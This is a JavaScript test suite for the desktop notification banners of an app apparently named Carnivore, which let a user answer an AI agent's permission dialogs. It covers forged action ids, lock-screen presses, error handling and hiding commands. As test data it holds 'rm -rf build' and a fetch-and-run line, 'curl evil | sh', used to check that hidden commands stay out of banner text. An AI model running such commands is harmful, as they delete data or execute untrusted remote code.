// and the real
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { fileURLToPath, pathToFileURL } from 'node:url';

const require = createRequire(import.meta.url);
const here = path.dirname(fileURLToPath(import.meta.url));
const repo = path.join(here, '..', '..');
const mac = path.join(repo, 'macOS');
const model = require(path.join(mac, 'banners', 'model.js'));
const { createBanners } = require(path.join(mac, 'banners', 'index.js'));
const { registerDesktopSettings } = require(path.join(mac, 'desktop-settings.js'));

const catalog = (await import(pathToFileURL(path.join(repo, 'client', 'js', 'i18n', 'catalog.en.js')).href)).default;
const format = await import(pathToFileURL(path.join(repo, 'client', 'js', 'i18n', 'format.js')).href);
const strings = require(path.join(mac, 'tray-menu', 'strings.js'));
const t = strings.createTranslator(catalog, (entry, params) => format.formatEntry(entry, params, 'en'));

const FP = 'a'.repeat(64);
const QFP = 'b'.repeat(64);
const flush = () => new Promise((r) => setImmediate(r));

const dialog = (extra = {}) => ({
  id: 'dlg:ses_1:aaaa', source: 'dialog', host: 'local', session_id: 'ses_1', session_name: 'build bot', kind: 'permission',
  question: 'Do you want to proceed?', options: ['Yes', 'Yes, and do not ask again', 'No'], multi_select: false, has_other: false,
  fingerprint: FP, startup_kind: null, summary: 'Bash: rm -rf build', questions: [], questions_fingerprint: null, questions_state: null,
  ...extra,
});
const askQuestions = (n, multiAt = -1) => Array.from({ length: n }, (_, i) => ({
  header: `h${i}`, question: `Question ${i + 1}?`, multi_select: i === multiAt,
  options: [{ label: `Q${i + 1} red`, description: '', preview: null }, { label: `Q${i + 1} blue`, description: '', preview: null }],
}));
const multiAsk = (n = 3, multiAt = -1) => dialog({
  kind: 'ask_user_question', summary: null, options: ['Q1 red', 'Q1 blue'], question: 'Question 1?', question_index: 1, question_total: n,
  questions: askQuestions(n, multiAt), questions_fingerprint: QFP, questions_state: 'matched',
});

const extractKinds = () => [...fs.readFileSync(path.join(repo, 'src', 'core', 'approvals', 'extract.py'), 'utf8')
  .matchAll(/^KIND_[A-Z_]+\s*=\s*"([a-z_]+)"/gm)].map((m) => m[1]);

function fakeNotification() {
  const made = [];
  class N {
    constructor(opts) { this.opts = opts; this.handlers = {}; this.shown = false; this.closed = false; made.push(this); }
    static isSupported() { return true; }
    on(name, fn) { this.handlers[name] = fn; return this; }
    show() { this.shown = true; }
    close() { this.closed = true; if (this.handlers.close) this.handlers.close({}); }
    press(index) { this.handlers.action({}, index); }
  }
  return { N, made };
}

function fakeApi(state) {
  const calls = [];
  return {
    calls,
    async getAuthed(route) {
      calls.push(['GET', route]);
      if (route.startsWith('/api/v1/approvals')) return { reachable: true, status: 200, data: { items: state.items, version: 1 }, error: null };
      if (route.startsWith('/api/v1/preferences')) return { reachable: true, status: 200, data: { values: state.prefs }, error: null };
      return { reachable: false, status: 404, data: null, error: 'no route' };
    },
    async sendAuthed(route, body, method) {
      calls.push([method, route, body]);
      return state.reply(route, body);
    },
  };
}

function rig(over = {}) {
  const state = { items: [], prefs: { desktop_banners: true, desktop_banner_hide_command: false }, reply: () => ({ reachable: true, status: 200, data: {}, error: null }), ...over.state };
  const api = over.api === undefined ? fakeApi(state) : over.api;
  const { N, made } = fakeNotification();
  const opened = [];
  const banners = createBanners({
    platform: 'darwin', getApi: () => api, Notification: N, readPermission: () => over.permission || 'unknown', t,
    isWindowFocused: () => !!over.focused, openApproval: (id) => opened.push(id), cap: over.cap === undefined ? null : over.cap,
    isLocked: over.isLocked,
  });
  return { state, api, made, opened, banners };
}

test('every kind in extract.py maps to buttons and none throws; a kind with no mapping would fail here', () => {
  const kinds = extractKinds();
  assert.deepEqual(kinds.sort(), ['ask_user_question', 'codex_approval', 'folder_trust', 'other', 'permission', 'plan_approval', 'unreadable']);
  for (const kind of kinds) {
    assert.ok(model.KIND_PLANS[kind], `${kind} has a mapping`);
    const plan = model.planFor(dialog({ kind, options: kind === 'unreadable' ? [] : ['One', 'Two'] }), { t });
    assert.equal(plan.post, true, kind);
    assert.ok(plan.buttons.length >= 1, `${kind} has at least one button`);
    assert.ok(plan.title.length > 0 && !plan.title.startsWith('desktop.banner.'), `${kind} title comes from the catalog: ${plan.title}`);
  }
  const startup = model.planFor(dialog({ kind: 'other', startup_kind: 'folder_trust', options: ['Yes, I trust this folder', 'No, exit'] }), { t });
  assert.deepEqual(startup.buttons.map((b) => b.label), ['Yes, I trust this folder', 'No, exit']);
});

test('buttons keep the dialog order and count; multi-select, no options and unreadable open the app; peers and agent actions never answer', () => {
  const perm = model.planFor(dialog(), { t });
  assert.deepEqual(perm.buttons.map((b) => [b.label, b.kind, b.optionIndex]),
    [['Yes', 'answer', 0], ['Yes, and do not ask again', 'answer', 1], ['No', 'answer', 2]]);
  assert.equal(perm.mode, 'single');
  for (const odd of [dialog({ kind: 'ask_user_question', multi_select: true }), dialog({ kind: 'ask_user_question', options: [], has_other: false }), dialog({ kind: 'unreadable', options: [] })]) {
    const plan = model.planFor(odd, { t });
    assert.equal(plan.mode, 'open_only');
    assert.deepEqual(plan.buttons.map((b) => b.kind), ['open_app']);
  }
  assert.equal(model.planFor(dialog({ host: 'peer-x' }), { t }).post, false, 'a paired computer posts its own banner');
  const action = model.planFor(dialog({ source: 'agent_action', kind: 'tool', options: [] }), { t });
  assert.equal(action.mode, 'open_only');
  assert.equal(model.planFor(dialog({ kind: 'ask_user_question', question_total: 2, questions_state: 'no_transcript', questions: [] }), { t }).mode, 'open_only',
    'an ask whose questions could not be matched opens the app');
  assert.equal(model.planFor(multiAsk(3, 1), { t }).mode, 'open_only', 'one multi-select question sends the whole ask to the app');
});

test('the visible-action cap: unbounded gives every option a button; a cap of 3 on 5 options gives two buttons and the more button', () => {
  assert.equal(model.VISIBLE_ACTION_CAP, null, 'the shipped default is unbounded until Alex reads the cap off macOS');
  const five = dialog({ options: ['A', 'B', 'C', 'D', 'E'] });
  const open = model.planFor(five, { t });
  assert.deepEqual(open.buttons.map((b) => b.label), ['A', 'B', 'C', 'D', 'E']);
  const capped = model.planFor(five, { t, cap: 3 });
  assert.deepEqual(capped.buttons.map((b) => [b.label, b.kind]), [['A', 'answer'], ['B', 'answer'], ['more... (opens carnivore)', 'open_app']]);
  assert.equal(model.planFor(dialog({ options: ['A', 'B', 'C'] }), { t, cap: 3 }).buttons.length, 3, 'a dialog that fits the cap is untouched');
});

test('button labels are cut and cleaned, the answer still names the full cached label', () => {
  const long = `Yes\u0007, and ${'x'.repeat(80)}`;
  const item = dialog({ options: [long, 'No'] });
  const plan = model.planFor(item, { t });
  assert.ok(plan.buttons[0].label.length <= 44 && plan.buttons[0].label.endsWith('...') && !/[\u0000-\u001f]/.test(plan.buttons[0].label));
  assert.equal(model.optionLabel(item, 0, 0), long);
});

test('action id round-trips and a forged one decodes to nothing', () => {
  const id = model.encodeActionId('ses_1', FP, 0, 2);
  assert.deepEqual(model.decodeActionId(id), { sessionId: 'ses_1', fingerprint: FP, step: 0, index: 2 });
  assert.deepEqual(model.decodeActionId(model.encodeActionId('remote:peer-x:a.b-c', FP, 3, 0)), { sessionId: 'remote:peer-x:a.b-c', fingerprint: FP, step: 3, index: 0 });
  for (const bad of ['', 'x', `ses_1|${'z'.repeat(64)}|0|0`, `ses_1|${FP}|0|-1`, `ses_1|${FP}|0|1.5`, `ses_1|${FP}|0`, `ses|1|${FP}|0|0`, null, 7]) {
    assert.equal(model.decodeActionId(bad), null, String(bad));
  }
  assert.equal(model.encodeActionId('has space', FP, 0, 0), null);
  assert.equal(model.encodeActionId('ses_1', 'nothex', 0, 0), null);
});

test('a single dialog is answered through dialog/answer with the cached label, the fingerprint and source owner_banner', async () => {
  const r = rig({ state: { items: [dialog()] } });
  await r.banners.onApprovals();
  assert.equal(r.made.length, 1);
  const n = r.made[0];
  assert.equal(n.shown, true);
  assert.deepEqual(n.opts.actions.map((a) => a.text), ['Yes', 'Yes, and do not ask again', 'No']);
  assert.ok(n.opts.actions.every((a) => a.type === 'button'));
  assert.equal(n.opts.title, 'build bot wants your ok');
  assert.equal(n.opts.body, 'Bash: rm -rf build');
  n.press(2);
  await flush();
  const posts = r.api.calls.filter((c) => c[0] === 'POST');
  assert.deepEqual(posts, [['POST', '/api/v1/sessions/ses_1/dialog/answer', { fingerprint: FP, choice: { option: 'No' }, source: 'owner_banner' }]]);
  assert.equal(n.closed, true);
});

test('the listener accepts the index from either argument: the second argument or details.actionIndex', async () => {
  for (const press of [(n) => n.handlers.action({}, 1), (n) => n.handlers.action({ actionIndex: 1 }), (n) => n.handlers.action({ actionIndex: 1 }, undefined)]) {
    const r = rig({ state: { items: [dialog()] } });
    await r.banners.onApprovals();
    press(r.made[0]);
    await flush();
    const post = r.api.calls.find((c) => c[0] === 'POST');
    assert.equal(post[2].choice.option, 'Yes, and do not ask again');
  }
});

test('a forged or out-of-range press answers nothing', async () => {
  const r = rig({ state: { items: [dialog()] } });
  await r.banners.onApprovals();
  r.made[0].press(9);
  r.made[0].press(-1);
  assert.equal((await r.banners.press(model.encodeActionId('ses_1', 'c'.repeat(64), 0, 0))).outcome, 'ignored', 'a fingerprint main never showed');
  assert.equal((await r.banners.press(model.encodeActionId('ses_other', FP, 0, 0))).outcome, 'ignored', 'a session main never showed');
  assert.equal((await r.banners.press(model.encodeActionId('ses_1', FP, 4, 0))).outcome, 'ignored', 'a step main is not on');
  assert.equal((await r.banners.press('garbage')).outcome, 'ignored');
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 0);
});

test('the 409 path presses nothing more: no retry, no re-read, the answer banner closes, "this question changed" posts', async () => {
  const r = rig({ state: { items: [dialog()], reply: () => ({ reachable: false, status: 409, data: null, body: { detail: { reason: 'dialog_changed' } }, error: 'HTTP 409' }) } });
  await r.banners.onApprovals();
  const readsBefore = r.api.calls.filter((c) => c[0] === 'GET').length;
  r.made[0].press(0);
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 1, 'exactly one write, never retried');
  assert.equal(r.api.calls.filter((c) => c[0] === 'GET').length, readsBefore, 'no fresh fingerprint is read to press again');
  assert.equal(r.made[0].closed, true);
  assert.equal(r.made.length, 2);
  assert.equal(r.made[1].opts.title, 'this question changed');
  assert.equal(r.made[1].opts.body, 'open carnivore to see the new one.');
  assert.equal(r.made[1].opts.actions, undefined, 'the notice carries no answer buttons');
  r.made[1].handlers.click();
  assert.deepEqual(r.opened, ['ses_1']);
});

test('a network failure or a 500 posts the "could not send" notice and does not retry', async () => {
  const r = rig({ state: { items: [dialog()], reply: () => ({ reachable: false, data: null, error: 'ECONNREFUSED' }) } });
  await r.banners.onApprovals();
  r.made[0].press(1);
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 1);
  assert.equal(r.made[1].opts.title, 'answer not sent');
  assert.equal(r.made[1].opts.body, 'could not send your answer. open carnivore.');
});

test('a 3-question ask: one banner per question in order, one answer-all with every answer, nothing sent before the last', async () => {
  const r = rig({ state: { items: [multiAsk(3)] } });
  await r.banners.onApprovals();
  assert.equal(r.made.length, 1);
  assert.match(r.made[0].opts.body, /^question 1 of 3\n/);
  assert.deepEqual(r.made[0].opts.actions.map((a) => a.text), ['Q1 red', 'Q1 blue']);
  r.made[0].press(1);
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 0, 'the first press only holds its answer');
  assert.equal(r.made.length, 2);
  assert.equal(r.made[0].closed, true);
  assert.match(r.made[1].opts.body, /^question 2 of 3\n/);
  r.made[1].press(0);
  await flush();
  assert.match(r.made[2].opts.body, /^question 3 of 3\n/);
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 0);
  r.made[2].press(1);
  await flush();
  const posts = r.api.calls.filter((c) => c[0] === 'POST');
  assert.deepEqual(posts, [['POST', '/api/v1/sessions/ses_1/dialog/answer-all',
    { questions_fingerprint: QFP, answers: [{ option: 'Q1 blue' }, { option: 'Q2 red' }, { option: 'Q3 blue' }], source: 'owner_banner' }]]);
  assert.equal(r.made[2].closed, true);
});

test('a 3-question ask whose ask drifted drops the held answers; a stale first-question button cannot answer the second', async () => {
  const r = rig({ state: { items: [multiAsk(3)] } });
  await r.banners.onApprovals();
  const first = r.made[0];
  first.press(0);
  await flush();
  first.press(1);
  await flush();
  assert.equal(r.made.length, 2, 'a stale step posts nothing new');
  r.state.items = [dialog({ id: 'x', fingerprint: 'c'.repeat(64) })];
  await r.banners.onApprovals();
  assert.equal(r.made[1].closed, true, 'the ask left the list, so its banner closes and its held answers go');
  r.state.items = [multiAsk(3)];
  await r.banners.onApprovals();
  assert.match(r.made[r.made.length - 1].opts.body, /^question 1 of 3\n/, 'the same ask coming back starts again from question 1');
});

test('a failure on answer-all drops the held answers and posts the notice', async () => {
  const r = rig({ state: { items: [multiAsk(2)], reply: () => ({ reachable: false, status: 409, data: null, error: 'HTTP 409' }) } });
  await r.banners.onApprovals();
  r.made[0].press(0);
  await flush();
  r.made[1].press(0);
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 1);
  assert.equal(r.made[r.made.length - 1].opts.title, 'this question changed');
});

test('one banner per open dialog, never re-posted; it closes when the dialog leaves the list; a dismissed banner stays dismissed', async () => {
  const r = rig({ state: { items: [dialog(), dialog({ id: 'dlg:ses_2:bbbb', session_id: 'ses_2', fingerprint: 'd'.repeat(64) })] } });
  await r.banners.onApprovals();
  await r.banners.onApprovals();
  assert.equal(r.made.length, 2, 'two dialogs, two banners, a repeat frame posts nothing');
  r.made[0].handlers.close({});
  await r.banners.onApprovals();
  assert.equal(r.made.length, 2, 'a dismissed banner is not posted again');
  r.state.items = [dialog({ id: 'dlg:ses_2:bbbb', session_id: 'ses_2', fingerprint: 'd'.repeat(64) })];
  await r.banners.onApprovals();
  assert.equal(r.made[1].closed, false);
  r.state.items = [];
  await r.banners.onApprovals();
  assert.equal(r.made[1].closed, true, 'answered anywhere, so the banner closes');
});

test('a press on a locked screen answers nothing: the banner closes and the app opens instead (review B1)', async () => {
  let locked = true;
  const r = rig({ state: { items: [dialog()] }, isLocked: () => locked });
  await r.banners.onApprovals();
  assert.equal(r.made.length, 1);
  r.made[0].press(1);
  await flush();
  assert.equal(r.api.calls.filter((c) => c[0] === 'POST').length, 0, 'no answer reached the server');
  assert.deepEqual(r.opened, ['ses_1']);
  assert.equal(r.made[0].closed, true);
  const { createScreenLock } = require(path.join(mac, 'screen-lock.js'));
  const handlers = {};
  const lock = createScreenLock({ on: (name, fn) => { handlers[name] = fn; } }, { platform: 'linux' });
  assert.equal(lock.isLocked(), false); handlers['lock-screen'](); assert.equal(lock.isLocked(), true);
  handlers['unlock-screen'](); assert.equal(lock.isLocked(), false);
  assert.equal(createScreenLock(null).isLocked(), false);
  locked = false;
  const u = rig({ state: { items: [dialog()] }, isLocked: () => locked });
  await u.banners.onApprovals();
  u.made[0].press(0); await flush();
  assert.equal(u.opened.length, 0);
  assert.equal(u.api.calls.filter((c) => c[0] === 'POST').length, 1, 'unlocked, the same press is an answer');
});

test('a denied or not-asked permission, the pref off, no api or a focused window post nothing and report banners not deliverable', async () => {
  assert.equal(model.bannersDeliverable({ prefOn: true, permission: 'unknown', apiPresent: true }).ok, true);
  assert.equal(model.bannersDeliverable({ prefOn: true, permission: 'allowed', apiPresent: true }).ok, true);
  for (const bad of [{ prefOn: true, permission: 'denied', apiPresent: true }, { prefOn: true, permission: 'not_asked', apiPresent: true },
    { prefOn: false, permission: 'unknown', apiPresent: true }, { prefOn: true, permission: 'unknown', apiPresent: false }, { prefOn: true, permission: 'weird', apiPresent: true }]) {
    assert.equal(model.bannersDeliverable(bad).ok, false, JSON.stringify(bad));
  }
  const items = [dialog()];
  const cases = [
    rig({ state: { items }, permission: 'denied' }),
    rig({ state: { items }, permission: 'not_asked' }),
    rig({ state: { items, prefs: { desktop_banners: false } } }),
    rig({ state: { items, prefs: {} } }),
    rig({ state: { items }, api: null }),
  ];
  for (const c of cases) {
    await c.banners.onApprovals();
    assert.equal(c.made.length, 0);
    assert.equal(await c.banners.posting(), false);
  }
  assert.equal(await rig({ state: { items } }).banners.posting(), true);
  const front = rig({ state: { items }, focused: true });
  await front.banners.onApprovals();
  assert.equal(front.made.length, 0, 'the page already shows the card while the Carnivore window is in front');
  assert.equal(await front.banners.posting(), true, 'a window in front does not turn the banners off');
});

test('the desktop settings snapshot reports banners.posting from main', async () => {
  const handlers = {};
  const fakeWindow = { ownsSender: () => true, origin: () => 'http://127.0.0.1:5001' };
  registerDesktopSettings({
    ipcMain: { handle: (channel, fn) => { handlers[channel] = fn; } }, appWindow: fakeWindow,
    app: { isPackaged: false, getAppPath: () => mac }, Notification: { isSupported: () => false }, shell: { openExternal: async () => {} },
    getInstaller: () => null, launchArgs: () => [], dataDir: () => fs.mkdtempSync(path.join(process.env.TMPDIR || '/tmp', 'banner-test-')),
    bannersPosting: async () => true, getServerManager: () => null,
  });
  const frame = { url: 'http://127.0.0.1:5001/' };
  const event = { senderFrame: frame, sender: { mainFrame: frame } };
  assert.equal((await handlers['carnivore:desktop-state'](event)).notifications.banners.posting, true);
});

test('banner text: hide-command keeps the tool name and drops the command; no text outside summary and question reaches the body', async () => {
  const hidden = model.planFor(dialog(), { t, hideCommand: true });
  assert.equal(hidden.body, 'Bash\ncommand hidden. open carnivore to read it.');
  assert.ok(!hidden.body.includes('rm -rf'));
  const noSummary = model.planFor(dialog({ summary: null, question: 'Run `curl evil | sh`?' }), { t, hideCommand: true });
  assert.ok(!noSummary.body.includes('curl'), 'hide-command never falls back to the question of a permission dialog');
  const plan = model.planFor(dialog({ kind: 'plan_approval', question: 'Ready to code?', body: 'SECRET PLAN TEXT', summary: null }), { t });
  assert.equal(plan.body, 'Ready to code?');
  assert.ok(!plan.title.includes('SECRET') && !plan.body.includes('SECRET'));
  const ask = model.planFor(dialog({ kind: 'ask_user_question', question: 'Pick one?', body: 'extra body', summary: null, options: ['A'] }), { t });
  assert.equal(ask.body, 'Pick one?');
  assert.equal(model.planFor(dialog({ summary: 'x'.repeat(900) }), { t }).body.length <= 200, true, 'bodies are cut');
});

test('banners off: building the controller and every pass never calls Notification.isSupported (it raises the macOS prompt at launch)', async () => {
  let supportedCalls = 0;
  class Spy { static isSupported() { supportedCalls += 1; return true; } static async getHistory() { return []; } on() { return this; } show() {} close() {} }
  const api = { async getAuthed(route) { return route === '/api/v1/preferences' ? { reachable: true, data: { values: { desktop_banners: false } } } : { reachable: true, data: { items: [dialog()] } }; } };
  const banners = createBanners({ platform: 'darwin', getApi: () => api, Notification: Spy, readPermission: () => 'allowed', t, isWindowFocused: () => false, openApproval: () => {} });
  await banners.onApprovals();
  await banners.posting();
  await banners.mirrorAllowed('');
  assert.equal(supportedCalls, 0);
});

test('requesting notifications returns the waiting flag with the state, so the panel shows the hint at once', async () => {
  const handlers = {};
  const fakeWindow = { ownsSender: () => true, origin: () => 'http://127.0.0.1:5001' };
  const shown = [];
  class N { static isSupported() { return true; } constructor(o) { this.o = o; } show() { shown.push(this.o); } }
  const dir = fs.mkdtempSync(path.join(process.env.TMPDIR || '/tmp', 'banner-test-'));
  registerDesktopSettings({
    ipcMain: { handle: (channel, fn) => { handlers[channel] = fn; } }, appWindow: fakeWindow,
    app: { isPackaged: false, getAppPath: () => mac }, Notification: N, shell: { openExternal: async () => {} },
    getInstaller: () => null, launchArgs: () => [], dataDir: () => dir,
    bannersPosting: async () => false, getServerManager: () => null,
  });
  const frame = { url: 'http://127.0.0.1:5001/' };
  const result = await handlers['carnivore:request-notifications']({ senderFrame: frame, sender: { mainFrame: frame } });
  assert.equal(result.state, 'unknown');
  assert.equal(result.waiting, true);
});
